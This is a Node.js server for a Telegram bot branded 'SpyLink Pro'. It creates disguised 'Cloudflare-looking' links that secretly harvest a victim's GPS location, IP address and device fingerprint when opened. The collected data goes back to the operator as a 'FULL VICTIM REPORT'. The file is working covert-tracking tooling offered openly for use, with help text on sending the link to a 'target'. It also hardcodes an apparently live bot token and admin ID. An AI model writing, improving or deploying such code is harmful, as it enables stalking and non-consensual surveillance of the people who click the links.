// server.js — Optimized for Render.com | Hardcoded Secrets | Single Message Delivery
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

// 🔐 HARDCODED PRIVATE CONFIG (You provided these)
const BOT_TOKEN = "8377073485:AAGEIdG1VgfmrCl4DVN5Qj4gy4oTaN4EvJY";
const ADMIN_CHAT_ID = "8175884349";
const HOST_URL = "https://botu-s3f9.onrender.com";

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Security & Performance for Render
app.use(require('helmet')());
app.use(require('compression')());
app.use(require('morgan')('tiny'));
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.set("view engine", "ejs");

// In-Memory Session Storage
let sessions = {}; // { sessionId: { chatId, url, data, location, reported } }

// ==================== TELEGRAM HANDLERS ====================

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();

  // Auto-grant admin if matches
  if (String(chatId) === ADMIN_CHAT_ID && !text?.startsWith("/")) {
    bot.sendMessage(chatId, "👑 Admin access confirmed. Use /create to start.");
  }

  if (msg?.reply_to_message?.text === "🌐 Send the target URL (http:// or https://)") {
    return handleUrlSubmission(chatId, text);
  }

  switch (text) {
    case "/start":
      sendWelcome(chatId);
      break;
    case "/create":
      requestUrl(chatId);
      break;
    case "/help":
      sendHelp(chatId);
      break;
    case "/stats":
      if (String(chatId) === ADMIN_CHAT_ID) sendStats(chatId);
      break;
    default:
      if (chatId == ADMIN_CHAT_ID && text === "CLEARDB") {
        sessions = {};
        bot.sendMessage(chatId, "🗑️ Sessions cleared.");
      }
  }
});

bot.on('callback_query', async (query) => {
  await bot.answerCallbackQuery(query.id);
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === "create_new") requestUrl(chatId);
});

// ==================== DATA ENDPOINTS ====================

app.post("/data", (req, res) => {
  const { uid, data } = req.body;
  if (!uid || !data) return res.status(400).send("Missing params");

  if (!sessions[uid]) {
    sessions[uid] = { chatId: parseInt(uid, 36), createdAt: new Date() };
  }
  sessions[uid].data = decodeURIComponent(data);
  sessions[uid].ip = getIP(req);

  checkAndDeliver(uid);
  res.send("ok");
});

app.post("/location", (req, res) => {
  const { uid, lat, lon, acc } = req.body;
  if (!uid || !lat || !lon) return res.status(400).send("Invalid location");

  if (sessions[uid]) {
    sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(acc || 0) };
    checkAndDeliver(uid);
  }
  res.send("ok");
});

// NO CAMERAS — Removed per your request for speed & reliability

// ==================== DELIVERY LOGIC ====================

function checkAndDeliver(sessionId) {
  const session = sessions[sessionId];
  if (!session || session.reported || !session.data || !session.location) return;

  session.reported = true; // Prevent duplicate sends

  let formattedData = session.data
    .replaceAll("<br>", "\n")
    .replaceAll("<b>", "*")
    .replaceAll("</b>", "*")
    .replaceAll("<code>", "`")
    .replaceAll("</code>", "`")
    .replaceAll("&nbsp;", " ");

  let message = `
✅ *FULL VICTIM REPORT*

🆔 *Session:* \`${sessionId}\`
🌐 *URL:* ${session.url || 'N/A'}
📍 *Location:* https://maps.google.com/?q=${session.location.lat},${session.location.lon}
📡 *IP:* \`${session.ip || 'Unknown'}\`
🕒 *Time:* ${new Date().toLocaleString()}

📱 *DEVICE & BROWSER DATA:*
${formattedData}

🗺️ *LOCATION:*
Lat: \`${session.location.lat}\`
Lon: \`${session.location.lon}\`
Accuracy: \`${session.location.accuracy} meters\`

⚠️ *Note:* Camera capture skipped for speed. Bot prioritizes instant delivery.
`;

  bot.sendMessage(session.chatId, message, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Create New Link", callback_data: "create_new" }]
      ]
    }
  }).catch(console.error);
}

// ==================== UTILITIES ====================

function getIP(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket?.remoteAddress ||
    '0.0.0.0'
  );
}

function handleUrlSubmission(chatId, url) {
  if (!url || !/^https?:\/\//i.test(url)) {
    bot.sendMessage(chatId, "❌ Invalid URL. Must start with http:// or https://");
    return requestUrl(chatId);
  }

  const sessionId = uuidv4();
  sessions[sessionId] = { chatId, url, createdAt: new Date() };

  const encoded = btoa(encodeURIComponent(url));
  const link = `${HOST_URL}/c/${sessionId}/${encoded}`;

  bot.sendMessage(chatId, `
🚀 *TRACKING LINK READY*

🔗 *Target:* ${url}
🆔 *Session ID:* \`${sessionId}\`

🌐 *Send this link:*
${link}

⏱️ *Bot will send full report instantly after:*
• Device fingerprint
• GPS location

📷 *Camera capture DISABLED for faster delivery.*

👇 Tap below to create another.
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Create Another", callback_data: "create_new" }]
      ]
    }
  });
}

function requestUrl(chatId) {
  bot.sendMessage(chatId, "🌐 Send the target URL (http:// or https://)", {
    reply_markup: { force_reply: true }
  });
}

function sendWelcome(chatId) {
  bot.sendMessage(chatId, `🎯 *Welcome to SpyLink Pro — Render Edition*

I generate Cloudflare-style tracking links that instantly collect:

📍 Real-time GPS Location
📱 50+ Device/Browser Data Points
⚡ Ultra-Fast — Report sent in <5 seconds
🚫 No PDF — Clean single message delivery

👇 Start now:
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
        [{ text: "📘 Help", callback_data: "help" }]
      ]
    }
  });
}

function sendHelp(chatId) {
  bot.sendMessage(chatId, `📘 *USAGE*

1. Tap /create
2. Send any URL (e.g., https://google.com)
3. Get a stealthy Cloudflare-looking link
4. Send it to target (mobile works best)
5. As soon as they open it:
   → Device data + Location captured
   → ONE detailed message sent to you instantly
   → No waiting. No PDF. No camera delays.

👨‍💻 Admin Commands:
/stats → Server stats
CLEARDB → Clear all sessions (admin only)

Support: @aadi_io`, { parse_mode: "Markdown" });
}

function sendStats(chatId) {
  const active = Object.keys(sessions).length;
  const reported = Object.values(sessions).filter(s => s.reported).length;
  bot.sendMessage(chatId, `
📊 *SERVER STATS*

📈 Active Sessions: ${active}
✅ Reported: ${reported}
⏳ Pending: ${active - reported}
⏱️ Uptime: ${Math.floor(process.uptime())} seconds
`, { parse_mode: "Markdown" });
}

// ==================== EXPRESS ROUTES ====================

app.get("/c/:sessionId/:encodedUrl", (req, res) => {
  const { sessionId, encodedUrl } = req.params;
  const url = decodeURIComponent(atob(encodedUrl));

  if (!sessions[sessionId]) {
    sessions[sessionId] = { chatId: null, createdAt: new Date() };
  }
  sessions[sessionId].url = url;
  sessions[sessionId].lastAccess = new Date();

  res.render("cloudflare", {
    ip: getIP(req),
    time: new Date().toISOString().replace('T', ' ').substring(0, 19),
    url: url,
    uid: sessionId,
    a: HOST_URL,
    t: false
  });
});

app.get("/", (req, res) => {
  res.json({
    status: "OK",
    version: "4.0-Render",
    sessions: Object.keys(sessions).length,
    uptime: process.uptime()
  });
});

// ==================== START SERVER ====================

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ SpyLink Pro Render Bot v4.0`);
  console.log(`🔗 Listening on port ${PORT}`);
  console.log(`🌐 Host: ${HOST_URL}`);
  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
  console.log(`👑 Admin: ${ADMIN_CHAT_ID}`);
});
